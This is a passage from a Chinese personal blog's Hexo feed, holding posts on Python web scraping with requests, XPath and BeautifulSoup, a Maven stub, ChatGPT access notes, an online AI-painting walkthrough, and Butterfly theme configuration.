        <content type="html"><![CDATA[<h3 id="一些理解"><a href="#一些理解" class="headerlink" title="一些理解"></a>一些理解</h3><ul><li><p>网络爬虫：爬虫完整的名字应该叫网络爬虫，因为它依赖于HTTP协议获取数据，浏览器上Web应用的基础，顾名思义需要网络。</p></li><li><p>所见即所得：另外，浏览器的原则是所见即所得，你在浏览器上看到的东西，都是服务器通过网络发到本地的，因此能见到的就能够爬到。</p></li><li><p>Robots.txt：在爬取之前应该仔细阅读网站设置的爬虫规则，上面有详细的允许和不允许爬的内容。</p></li></ul><p>爬虫基本运行过程一般是三个步骤：请求数据，过滤数据，保存数据。</p><hr><h1 id="一-Requests-概述"><a href="#一-Requests-概述" class="headerlink" title="一. Requests-概述"></a>一. Requests-概述</h1><p>Request是Python的第三方库，用于网络请求并接收返回的数据，你需要在Python的虚拟环境中安装使用。</p><ul><li><p>Request帮助你发送网络请求，同时你可以自定义Request携带的参数。</p></li><li><p>另外，Request模块接收响应请求的数据，并把Response作为函数的返回。</p></li><li><p>如果你想实现一个爬虫，对返回的网页文件进行Xpath&#x2F;正则表达式解析，并将你需要的内容存储即可。</p></li></ul><h1 id="二-Request基础"><a href="#二-Request基础" class="headerlink" title="二. Request基础"></a>二. Request基础</h1><h2 id="1-下载-安装"><a href="#1-下载-安装" class="headerlink" title="1. 下载&amp;安装"></a>1. 下载&amp;安装</h2><pre><code class="cmd">pip/pip3 install requests</code></pre><h2 id="2-Request库"><a href="#2-Request库" class="headerlink" title="2. Request库"></a>2. Request库</h2><h3 id="关于request"><a href="#关于request" class="headerlink" title="关于request"></a>关于request</h3><p>request支持各种HTTP方法，同时你可以指定请求所携带的内容。</p><ul><li>获取响应文件</li></ul><pre><code class="Python">response = request.get(url)</code></pre><ul><li>带上请求头headers</li></ul><pre><code class="Python">response = request.get(url, headers = headers)</code></pre><ul><li>伪装浏览器代理，避免反爬虫<br>*如果你向<a href="https://www.douban.com/%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%93%8D%E5%BA%94%E7%A0%81%E4%B8%BA418%EF%BC%8C">https://www.douban.com/发送请求，响应码为418，</a></li></ul><pre><code class="Python">headers = &#123;    &#39;user-agent&#39;:    &#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 Edg/116.0.1938.69&#39;    &#125;</code></pre><h3 id="关于response"><a href="#关于response" class="headerlink" title="关于response"></a>关于response</h3><p>你可以定义参数response（或者其他名字）接收request的返回。</p><ul><li>返回响应状态码</li></ul><pre><code class="Python">status_code = response.status_code</code></pre><ul><li>返回网页HTML文件</li></ul><pre><code class="Python">content = response.content</code></pre><h3 id="了解更多"><a href="#了解更多" class="headerlink" title="了解更多"></a>了解更多</h3><ul><li><a href="https://www.runoob.com/python3/python-requests.html">菜鸟教程</a></li></ul><h1 id="三-代码实例"><a href="#三-代码实例" class="headerlink" title="三. 代码实例"></a>三. 代码实例</h1><pre><code class="python">    import requests    url = &#39;https://www.baidu.com&#39;    response = requests.get(url)    if(response.status_code == 200):        print(response.content)    else:        print(response.status_code)</code></pre><h1 id="四-问题？"><a href="#四-问题？" class="headerlink" title="四. 问题？"></a>四. 问题？</h1><h2 id="1-response-text-response-content返回中文？"><a href="#1-response-text-response-content返回中文？" class="headerlink" title="1. response.text&#x2F;response.content返回中文？"></a>1. response.text&#x2F;response.content返回中文？</h2><p>你可以使用 <em><strong>response.content.decode(‘utf-8’)</strong></em> 使得content正常的显示中文内容。</p><p>另外， <em><strong>response.text</strong></em> 使用推测的解码格式（ISO-8859-1），相当于 <em><strong>response.content.decode(response.encoding)</strong></em> 。</p><h2 id="2-418-I’m-a-teapot？"><a href="#2-418-I’m-a-teapot？" class="headerlink" title="2. 418 | I’m a teapot？"></a>2. 418 | I’m a teapot？</h2><p>大概：服务器表示我是一个茶壶，需要咖啡的话别找我。</p><p>当然，具体意思需要结合实际场景。</p><p>如果某些网站反爬虫，那么如果你不表示你的代理是浏览器的话，你也会收到418。</p><p>解决方案也很简单，使用 <em><strong>headers{‘user-agent’:’xxx’}</strong></em> 来声称你使用浏览器代理访问网站。</p><h1 id="一-Xpath"><a href="#一-Xpath" class="headerlink" title="一. Xpath"></a>一. Xpath</h1><h2 id="1-Xpath基础"><a href="#1-Xpath基础" class="headerlink" title="1. Xpath基础"></a>1. Xpath基础</h2><p>Xpath适用于解析HTML格式文件，并且语法及其简介。</p><h2 id="2-对str对象使用Xpath"><a href="#2-对str对象使用Xpath" class="headerlink" title="2. 对str对象使用Xpath"></a>2. 对str对象使用Xpath</h2><p>对于一般的HTML格式响应对象 <em><strong>response.text()</strong></em> 是字符串类型，因此在使用之前： <code>from lxml import etree</code> </p><h2 id="3-Xpath语法"><a href="#3-Xpath语法" class="headerlink" title="3. Xpath语法"></a>3. Xpath语法</h2><p>这里先举个例子（也是我开始学爬虫的测试网站）</p><p><img src="/img/spider_analysis/image.png" alt="Alt text"></p><p>如果你想拿到 <em><strong>a标签</strong></em> 的href属性：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;@href</p><p>如果你想拿到 <em><strong>img标签</strong></em> 的src属性：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;span&#x2F;img&#x2F;@src</p><p>如果你想拿到 <em><strong>b标签</strong></em> 的内容：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;b&#x2F;text()</p><p>&#x2F;&#x2F;div能够锁定所有div标签，这也是经常使用的Xpath开头，当然你也可以明确定位一个标签&#x2F;&#x2F;div[@class&#x3D;’slist’]</p><p>下面是详细语法</p><p>&#x2F;:子标签<br>&#x2F;&#x2F;:子孙标签<br>@：取属性<br>text()：取内容</p><h1 id="二-JSON"><a href="#二-JSON" class="headerlink" title="二. JSON"></a>二. JSON</h1><h2 id="1-JSON基础"><a href="#1-JSON基础" class="headerlink" title="1. JSON基础"></a>1. JSON基础</h2><p>json用于解析json类型格式响应，这是非常普遍的，在异步加载的网页中，很多后端数据通过json格式传到前端进行渲染，得到浏览器显示的HTML文件。比如微博。</p><h2 id="2-Python字典处理JSON"><a href="#2-Python字典处理JSON" class="headerlink" title="2. Python字典处理JSON"></a>2. Python字典处理JSON</h2><p>Python字典和Java对象很相似，Json（JavaScript Object Notation）也可以通过python字典进行处理。</p><p><code>comment_json = json.loads(response.text)</code></p><h2 id="3-Python字典语法"><a href="#3-Python字典语法" class="headerlink" title="3. Python字典语法"></a>3. Python字典语法</h2><p>这个很简单…</p><p>额..还是记一下吧</p><pre><code class="python">user = &#123;    &#39;uid&#39;: &#39;&#39;    &#39;username&#39;: &#39;&#39;    &#39;password&#39;: &#39;&#39;    &#39;friends&#39;: []&#125;</code></pre><p>dict[“xxx”]:取字典中xxx</p><h1 id="三-BS4"><a href="#三-BS4" class="headerlink" title="三. BS4"></a>三. BS4</h1><h2 id="1-bs4基础"><a href="#1-bs4基础" class="headerlink" title="1. bs4基础"></a>1. bs4基础</h2><h2 id="2-引入bs4"><a href="#2-引入bs4" class="headerlink" title="2. 引入bs4"></a>2. 引入bs4</h2><p><code>from bs4 import BeautifulSoup</code></p><h2 id="3-bs4语法"><a href="#3-bs4语法" class="headerlink" title="3. bs4语法"></a>3. bs4语法</h2><pre><code class="python">soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)tag_div = soup.find_all(&quot;div&quot;,class_=&#39;result c-container xpath-log new-pmd&#39;)link = i.get(&#39;mu&#39;)</code></pre><h1 id="一-TXT"><a href="#一-TXT" class="headerlink" title="一. TXT"></a>一. TXT</h1><p>代码比较简单,看一下应该就懂了…</p><p>对于列表</p><pre><code class="Python">    # 是否保存    save = input(&quot;共&quot; + str(len(comment_list)) + &quot;条记录，保存到commen.txt（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        print(&quot;正在写入中...&quot;)        with open(&quot;comment.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            for comment in tqdm(comment_list):                f.writelines(comment + &quot;\n&quot;)</code></pre><p>对于字典</p><pre><code class="Python">    # 是否保存？    save = input(&quot;共&quot; + str(len(list_dic_blog)) + &quot;条记录，保存到blog.txt（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        with open(&quot;blog.txt&quot;, &quot;w&quot;, encoding=&#39;Utf-8&#39;) as f:            for dic_blog in tqdm(list_dic_blog):                f.writelines(str(dic_blog) + &quot;\n&quot;)</code></pre><h1 id="二-JSON-1"><a href="#二-JSON-1" class="headerlink" title="二. JSON"></a>二. JSON</h1><pre><code class="Python">    json_str = json.dumps(the_dict,indent=4,ensure_ascii=False)    with open(file_name, &#39;w&#39;) as json_file:        json_file.write(json_str)</code></pre><h1 id="三-Excel"><a href="#三-Excel" class="headerlink" title="三. Excel"></a>三. Excel</h1><pre><code class="python"># -*- coding: utf-8 -*-import xlsxwriter as xw  def xw_toExcel(data, fileName):  # xlsxwriter库储存数据到excel    workbook = xw.Workbook(fileName)  # 创建工作簿    worksheet1 = workbook.add_worksheet(&quot;sheet1&quot;)  # 创建子表    worksheet1.activate()  # 激活表    title = [&#39;序号&#39;, &#39;酒店&#39;, &#39;价格&#39;]  # 设置表头    worksheet1.write_row(&#39;A1&#39;, title)  # 从A1单元格开始写入表头    i = 2  # 从第二行开始写入数据    for j in range(len(data)):        insertData = [data[j][&quot;id&quot;], data[j][&quot;name&quot;], data[j][&quot;price&quot;]]        row = &#39;A&#39; + str(i)        worksheet1.write_row(row, insertData)        i += 1    workbook.close()  # 关闭表  # &quot;-------------数据用例-------------&quot;testData = [    &#123;&quot;id&quot;: 1, &quot;name&quot;: &quot;立智&quot;, &quot;price&quot;: 100&#125;,    &#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;维纳&quot;, &quot;price&quot;: 200&#125;,    &#123;&quot;id&quot;: 3, &quot;name&quot;: &quot;如家&quot;, &quot;price&quot;: 300&#125;,]fileName = &#39;测试.xlsx&#39;xw_toExcel(testData, fileName)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发（一）-Maven</title>
      <link href="/posts/web_maven/"/>
      <url>/posts/web_maven/</url>
      
        <content type="html"><![CDATA[<p><em>你需要先了解…</em></p><p><em>关于此文章…</em></p><h1 id="一-Maven基础"><a href="#一-Maven基础" class="headerlink" title="一. Maven基础"></a>一. Maven基础</h1><p>Maven用于项目管理，包括以下功能：</p><ul><li><p>依赖管理：依赖指我们项目中使用的第三方Jar包。<br> 在项目构建过程中，需要引入大量依赖，maven帮助你自动导入以及这个依赖所依赖的依赖。另外，maven帮助你管理依赖的版本。</p></li><li><p>简化项目构建：maven提供标准化的Java项目结构,通过Maven你可以快速创建Java项目。</p></li></ul><h1 id="二-Maven实现"><a href="#二-Maven实现" class="headerlink" title="二. Maven实现"></a>二. Maven实现</h1><h2 id="1-Maven下载-安装"><a href="#1-Maven下载-安装" class="headerlink" title="1. Maven下载&amp;安装"></a>1. Maven下载&amp;安装</h2><p> (参考文章)[<a href="https://blog.csdn.net/u012660464/article/details/114113349]">https://blog.csdn.net/u012660464/article/details/114113349]</a></p><h2 id="2-Maven构建项目"><a href="#2-Maven构建项目" class="headerlink" title="2. Maven构建项目"></a>2. Maven构建项目</h2><h2 id="3-pom-xml"><a href="#3-pom-xml" class="headerlink" title="3. pom.xml"></a>3. pom.xml</h2>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发-写在前面</title>
      <link href="/posts/web_pre/"/>
      <url>/posts/web_pre/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模板</title>
      <link href="/posts/a/"/>
      <url>/posts/a/</url>
      
        <content type="html"><![CDATA[<h1 id="目录及标签说明"><a href="#目录及标签说明" class="headerlink" title="目录及标签说明"></a>目录及标签说明</h1><h2 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h2><p>hexo+butterfly博客搭建教程。</p><h2 id="computer"><a href="#computer" class="headerlink" title="computer"></a>computer</h2><p>计算机相关基础知识。</p><h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>计算机网络。</p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>操作系统。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>web应用。</p><h2 id="software"><a href="#software" class="headerlink" title="software"></a>software</h2><p>软件。</p><h2 id="seed"><a href="#seed" class="headerlink" title="seed"></a>seed</h2><p>seed实验记录。</p><h2 id="security"><a href="#security" class="headerlink" title="security"></a>security</h2><p>安全。</p><h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>爬虫。</p><h2 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h2><p>人工智能面向大众服务的应用，包括ChatGPT，AI绘画等。</p><h2 id="ml"><a href="#ml" class="headerlink" title="ml"></a>ml</h2><p>机器学习相关算法，面向技术人员的应用。</p><h2 id="steg"><a href="#steg" class="headerlink" title="steg"></a>steg</h2><p>信息隐藏，包括水印和隐写。</p>]]></content>
      
      
      <categories>
          
          <category> 目录说明 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGPT</title>
      <link href="/posts/ai_chatgpt/"/>
      <url>/posts/ai_chatgpt/</url>
      
        <content type="html"><![CDATA[<h2 id="国内接口"><a href="#国内接口" class="headerlink" title="国内接口"></a>国内接口</h2><ul><li><a href="https://c.binjie.fun/">ALchatOS</a></li></ul><h2 id="ChatGPT官网"><a href="#ChatGPT官网" class="headerlink" title="ChatGPT官网"></a>ChatGPT官网</h2><h3 id="1-找个梯子"><a href="#1-找个梯子" class="headerlink" title="1. 找个梯子"></a>1. 找个梯子</h3><h3 id="2-找个国外手机号"><a href="#2-找个国外手机号" class="headerlink" title="2. 找个国外手机号"></a>2. 找个国外手机号</h3><h3 id="3-正常注册账号使用"><a href="#3-正常注册账号使用" class="headerlink" title="3. 正常注册账号使用"></a>3. 正常注册账号使用</h3>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 人工智能 </tag>
            
            <tag> ChatGPT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI绘画</title>
      <link href="/posts/ai_painting/"/>
      <url>/posts/ai_painting/</url>
      
        <content type="html"><![CDATA[<h1 id="在线AI绘画"><a href="#在线AI绘画" class="headerlink" title="在线AI绘画"></a>在线AI绘画</h1><h2 id="网址：LiblibAI·哩布哩布AI-中国领先原创AI模型分享社区"><a href="#网址：LiblibAI·哩布哩布AI-中国领先原创AI模型分享社区" class="headerlink" title="网址：LiblibAI·哩布哩布AI-中国领先原创AI模型分享社区"></a>网址：<a href="LiblibAI%C2%B7%E5%93%A9%E5%B8%83%E5%93%A9%E5%B8%83AI-%E4%B8%AD%E5%9B%BD%E9%A2%86%E5%85%88%E5%8E%9F%E5%88%9BAI%E6%A8%A1%E5%9E%8B%E5%88%86%E4%BA%AB%E7%A4%BE%E5%8C%BA">LiblibAI·哩布哩布AI-中国领先原创AI模型分享社区</a></h2><h2 id="教程："><a href="#教程：" class="headerlink" title="教程："></a>教程：</h2><h3 id="1-进入绘画页面"><a href="#1-进入绘画页面" class="headerlink" title="1. 进入绘画页面"></a>1. 进入绘画页面</h3><p>点击网址，来到在线 AI 绘画首页。登录你的账号（QQ 就行）。点击右上角<em><strong>在线Stable Diffusion</strong></em>，进入在线绘画页面。</p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image.png" alt="Alt text"></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-1.png" alt="Alt text"></p><h3 id="2-选择模型"><a href="#2-选择模型" class="headerlink" title="2. 选择模型"></a>2. 选择模型</h3><p>在首页中选择一个模型，这里选择<em><strong>麦橘写实</strong></em>。<em>不同的模型适用于不同的类型的图画创作。</em></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-2.png" alt="Alt text"></p><h3 id="3-复制图片参数"><a href="#3-复制图片参数" class="headerlink" title="3. 复制图片参数"></a>3. 复制图片参数</h3><p>点击模型进入页面查看图片<em><strong>详细信息</strong></em>，这里是图片生成的一些参数，<em><strong>复制</strong></em>就行。</p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-3.png" alt="Alt text"></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-4.png" alt="Alt text"></p><h3 id="4-填写参数绘画"><a href="#4-填写参数绘画" class="headerlink" title="4. 填写参数绘画"></a>4. 填写参数绘画</h3><p>返回绘画页面，<em><strong>Stable Diffusion 模型选择麦橘写实</strong></em>，<em><strong>粘贴</strong></em>刚才复制的的信息。</p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-9.png" alt="Alt text"></p><p><em>如果你想生成多张图片，修改以下内容。</em></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-5.png" alt="Alt text"></p><h3 id="5-耐心等待生成图片"><a href="#5-耐心等待生成图片" class="headerlink" title="5. 耐心等待生成图片"></a>5. 耐心等待生成图片</h3><p>点击<em><strong>生成图片</strong></em>，耐心等待就好了。下面是图片展示，AI绘画并不一定完美，可以 PS等工具完善。</p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-6.png" alt="Alt text"></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-7.png" alt="Alt text"></p><p><img src="/img/ai_%E5%9C%A8%E7%BA%BFAI%E7%BB%98%E7%94%BB/image-8.png" alt="Alt text"></p><h3 id="6-最后"><a href="#6-最后" class="headerlink" title="6.最后"></a>6.最后</h3><p>恭喜你，已经学会了基础的绘图。接下来，选择你喜欢的模型，慢慢了解并调节各种参数，绘画出你喜欢的图片吧！</p><p>对了，上面介绍了文生图模式，图生图模式一样有趣。赶快试试吧，你就是下一个 AI 调教大师。</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI绘画 </tag>
            
            <tag> 在线AI绘画 </tag>
            
            <tag> 哩布哩布 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客（二）：美化你的个人博客</title>
      <link href="/posts/blog_butterfly/"/>
      <url>/posts/blog_butterfly/</url>
      
        <content type="html"><![CDATA[<p><em>此文章将会指引你使用butterfly美化你的hexo博客</em></p><h1 id="一-部署butterfly主题"><a href="#一-部署butterfly主题" class="headerlink" title="一. 部署butterfly主题"></a>一. 部署butterfly主题</h1><h2 id="1-butterfly主题"><a href="#1-butterfly主题" class="headerlink" title="1. butterfly主题"></a>1. butterfly主题</h2><p>butterfly是hexo框架下的一个主题。</p><p>butterfly主题：</p><p><img src="/img/blog_butterfly/image.png" alt="Alt text"></p><p>相比于原生的hexo博客样式，我相信你肯定更喜欢butterfly。</p><p>了解更多？<a href="https://butterfly.js.org/">butterfly</a></p><h2 id="2-下载butterfly主题"><a href="#2-下载butterfly主题" class="headerlink" title="2. 下载butterfly主题"></a>2. 下载butterfly主题</h2><p>参考文档：<a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安裝文檔(一) 快速開始</a></p><p>在myblog目录下输入命令安装butterfly：</p><pre><code>git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</code></pre><h2 id="3-安装插件"><a href="#3-安装插件" class="headerlink" title="3. 安装插件"></a>3. 安装插件</h2><p>安装pug和stylus渲染器：</p><pre><code>npm install hexo-renderer-pug hexo-renderer-stylus --save</code></pre><h2 id="4-应用主题"><a href="#4-应用主题" class="headerlink" title="4. 应用主题"></a>4. 应用主题</h2><p>修改配置文件_config.yml：</p><pre><code>theme: butterfly</code></pre><h2 id="5-升级建议"><a href="#5-升级建议" class="headerlink" title="5. 升级建议"></a>5. 升级建议</h2><p>为了減少升级主题带来的不便，我们可以把主题文件夹中的 _config.yml 重命名为 _config.butterfly.yml，复制到 Hexo 根目录下与_config.yml同级。</p><p>Hexo会自动合并主题中的_config.yml和 _config.butterfly.yml ，如果存在同名配置，会使用_config.butterfly.yml的配置，其优先度较高。所以像和博客网址相关联的固定资料可以设置在_config.yml中，比如博客的标题、作者信息和邮箱等等资料，而和主题样式相关的配置放在 _config.butterfly.yml 中，那么在将来你想换一个主题是很方便的。</p><h1 id="二-美化主题"><a href="#二-美化主题" class="headerlink" title="二. 美化主题"></a>二. 美化主题</h1><h2 id="1-图片-图标"><a href="#1-图片-图标" class="headerlink" title="1. 图片&amp;图标"></a>1. 图片&amp;图标</h2><h3 id="（1）网站图标"><a href="#（1）网站图标" class="headerlink" title="（1）网站图标"></a>（1）网站图标</h3><p><strong>.config.butterfly.yml配置：</strong></p><pre><code>    # Favicon（網站圖標）    favicon: /img/favicon.jpg</code></pre><p>将网站图标favicon.jpg放置在此目录：blog\hexo\themes\butterfly\source\img</p><hr><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/favicon.jpg" alt="Alt text"></p><p><img src="/img/blog_butterfly/image-5.png" alt="Alt text"></p><h3 id="（2）-网站背景图片"><a href="#（2）-网站背景图片" class="headerlink" title="（2） 网站背景图片"></a>（2） 网站背景图片</h3><p><strong>.config.butterfly.yml配置：</strong></p><pre><code># The banner image of home pageindex_img: /img/background.jpg</code></pre><p>将网站背景图片background.jpg放置在此目录：blog\hexo\themes\butterfly\source\img</p><hr><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/background.jpg" alt="Alt text"></p><p><img src="/img/blog_butterfly/image-1.png" alt="Alt text"></p><h3 id="（3）-作者头像"><a href="#（3）-作者头像" class="headerlink" title="（3） 作者头像"></a>（3） 作者头像</h3><pre><code># Avatar (頭像)avatar:img: /img/avatar.jpgeffect: false</code></pre><p>将作者头像avatar.jpg放置在此目录：blog\hexo\themes\butterfly\source\img</p><hr><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/avatar.jpg" alt="Alt text"></p><p><img src="/img/blog_butterfly/image-2.png" alt="Alt text"></p><h3 id="（4）-菜单顶图"><a href="#（4）-菜单顶图" class="headerlink" title="（4） 菜单顶图"></a>（4） 菜单顶图</h3><pre><code># If the banner of page not setting, it will show the top_imgdefault_top_img: /img/default_top_img.jpg</code></pre><p>将菜单顶图default_top_img.jpg放置在此目录：blog\hexo\themes\butterfly\source\img</p><hr><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/default_top_img.jpg" alt="Alt text"></p><p><em>其他菜单页面同样显示默认顶图</em></p><p><img src="/img/blog_butterfly/image-6.png" alt="Alt text"></p><h3 id="（5）-404页面"><a href="#（5）-404页面" class="headerlink" title="（5） 404页面"></a>（5） 404页面</h3><pre><code># Replace Broken Images (替換無法顯示的圖片)error_img:flink: /img/friend_404.gifpost_page: /img/404.jpg# A simple 404 pageerror_404:enable: truesubtitle: &#39;Page Not Found&#39;background: /img/404.jpg</code></pre><p>这里使用默认的设置即可</p><h3 id="（6）-图片懒加载"><a href="#（6）-图片懒加载" class="headerlink" title="（6） 图片懒加载"></a>（6） 图片懒加载</h3><pre><code># Lazyload (圖片懶加載)# https://github.com/verlok/vanilla-lazyloadlazyload:  enable: true  loadingImg: /img/loading.gif  field: site # site/post  placeholder:  blur: false</code></pre><h2 id="2-网站首页"><a href="#2-网站首页" class="headerlink" title="2. 网站首页"></a>2. 网站首页</h2><p><strong>_config.yml配置：</strong></p><pre><code># Sitetitle: 良月的小窝   #网站标题subtitle: &#39;&#39;description: 郎朗晴天   #个性签名keywords:author: 良月    #博客作者language: zh-CN    #网站语言为简体中文timezone: Asia/Shanghai     #Shanghai是中国时区</code></pre><p><strong>_config.butterfly.yml配置：</strong></p><pre><code># the subtitle on homepage (主頁subtitle)subtitle:enable: true# Typewriter Effect (开启打字效果)effect: true# loop (循環打字)loop: true# source調用第三方服務# source: false 關閉調用# source: 1  調用搏天api的隨機語錄（簡體）# source: 2  調用一言網的一句話（簡體）# source: 3  調用一句網（簡體）# source: 4  調用今日詩詞（簡體）# subtitle 會先顯示 source , 再顯示 sub 的內容source: false# 如果有英文逗号&#39; , &#39;,请使用转义字元 &amp;#44;# 如果有英文双引号&#39; &quot; &#39;,请使用转义字元 &amp;quot;# 开头不允許转义字元，如需要，请把整個句子用双引号包住# 如果关闭打字效果，subtitle只会现示sub的第一行文字sub:    - BY 良月    - 山野渐染暮春色，碧落微醺残阳曦。    - 碎花飘落云海地，琐事淡没扶摇时。    - 凡人入梦蝴蝶语，天官醉酒云云归。    - 众生皆苦非尘世，你我逍遥不自知。</code></pre><h2 id="3-侧边栏"><a href="#3-侧边栏" class="headerlink" title="3. 侧边栏"></a>3. 侧边栏</h2><h3 id="个人资料"><a href="#个人资料" class="headerlink" title="个人资料"></a>个人资料</h3><p><strong>Follow Me：</strong></p><pre><code>card_author:    enable: true    description:    button:    enable: true    icon: fab fa-github    text: Follow Me    link: https://github.com/Yangcheneee    #GitHub个人主页</code></pre><p><strong>社交媒体：</strong></p><pre><code># Social Settings (社交圖標設置)# formal:#   icon: link || the description || colorsocial:fab fa-github: https://github.com/Yangcheneee || Githubfab fa-qq:  tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2657761647&amp;website=www.oicqzone.com || QQfas fa-envelope-open-text: mailto:2657761647@qq.com || Email</code></pre><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/image-11.png" alt="Alt text"></p><h3 id="公告"><a href="#公告" class="headerlink" title="公告"></a>公告</h3><p><strong>.config.butterfly.yml配置：</strong></p><pre><code>card_announcement:    enable: true    content: 欢迎来到我的个人博客</code></pre><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/image-13.png" alt="Alt text"></p><h3 id="网站咨询"><a href="#网站咨询" class="headerlink" title="网站咨询"></a>网站咨询</h3><p><strong>.config.butterfly.yml配置：</strong></p><pre><code>card_webinfo:    enable: true    post_count: true    last_push_date: true    sort_order: # Don&#39;t modify the setting unless you know how it works</code></pre><p><strong>效果图：</strong></p><p><img src="/img/blog_butterfly/image-14.png" alt="Alt text"></p><h2 id="4-导航菜单"><a href="#4-导航菜单" class="headerlink" title="4. 导航菜单"></a>4. 导航菜单</h2><p><strong>预览：</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/blog_butterfly/image-3.png" alt="Alt text"></h2><p><strong>_config.butterfly.yml配置：</strong></p><pre><code># Menu 目錄menu:主页: / || fas fa-home博文 || fa fa-graduation-cap:     分类: /categories/ || fa fa-archive 标签: /tags/ || fa fa-tags 归档: /archives/ || fa fa-folder-open生活 || fas fa-list: 分享: /shuoshuo/ || fa fa-comments 相册: /photos/ || fa fa-camera-retro 音乐: /music/ || fa fa-music 影视: /movies/ || fas fa-video友链: /link/ || fa fa-link留言板: /messageboard/ || fa fa-paper-plane关于笔者: /about/ || fas fa-heart  </code></pre><h2 id="5-本地搜索功能"><a href="#5-本地搜索功能" class="headerlink" title="5. 本地搜索功能"></a>5. 本地搜索功能</h2><p><strong>预览：</strong></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/img/blog_butterfly/image-4.png" alt="Alt text"></h2><p><strong>安装搜索插件：</strong></p><pre><code>npm install hexo-generator-search --save</code></pre><p><strong>_config.butterfly.yml配置：</strong></p><pre><code># Local searchlocal_search:  enable: true  labels:    input_placeholder: Search for Posts    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot; # 如果没有查到内容相关内容显示</code></pre><h2 id="6-博文：分类-标签-归档"><a href="#6-博文：分类-标签-归档" class="headerlink" title="6. 博文：分类|标签|归档"></a>6. 博文：分类|标签|归档</h2><h3 id="创建分类界面"><a href="#创建分类界面" class="headerlink" title="创建分类界面"></a>创建分类界面</h3><pre><code>hexo new page categories</code></pre><p>打开.&#x2F;source&#x2F;categories&#x2F;index.md</p><pre><code>---title: 分类date: 2023-08-20 20:20:51type: &quot;categories&quot;comments: false---</code></pre><h3 id="创建标签页面"><a href="#创建标签页面" class="headerlink" title="创建标签页面"></a>创建标签页面</h3><pre><code>hexo new page tags</code></pre><p>打开.&#x2F;source&#x2F;tags&#x2F;index.md</p><pre><code>---title: 标签date: 2023-08-20 20:20:16type: &quot;tags&quot;comments: falseorderby: randomorder: 1---</code></pre><h3 id="创建归档界面"><a href="#创建归档界面" class="headerlink" title="创建归档界面"></a>创建归档界面</h3><p>默认创建…</p><h2 id="7-生活：分享-相册-音乐-影视"><a href="#7-生活：分享-相册-音乐-影视" class="headerlink" title="7.生活：分享|相册|音乐|影视"></a>7.生活：分享|相册|音乐|影视</h2><p>待更新…</p><h2 id="8-友情链接页面"><a href="#8-友情链接页面" class="headerlink" title="8. 友情链接页面"></a>8. 